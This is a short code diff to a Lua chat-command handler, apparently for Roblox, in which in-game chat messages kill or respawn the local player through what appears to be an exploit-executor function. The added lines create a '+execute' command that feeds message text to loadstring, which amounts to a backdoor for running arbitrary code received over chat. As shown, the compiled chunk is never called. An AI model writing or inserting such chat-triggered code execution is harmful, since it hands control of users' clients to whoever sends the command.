@@ -64,5 +64,7 @@ TextChatService.MessageReceived:Connect(function(msg)
 		replicatesignal(localPlayer.Kill)
 	elseif arg[1] == "+respawn" then
 		replicatesignal(localPlayer.ConnectDiedSignalBackend)
+	elseif arg[1] == "+execute" then
+		loadstring(arg[2])
 	end
 end)
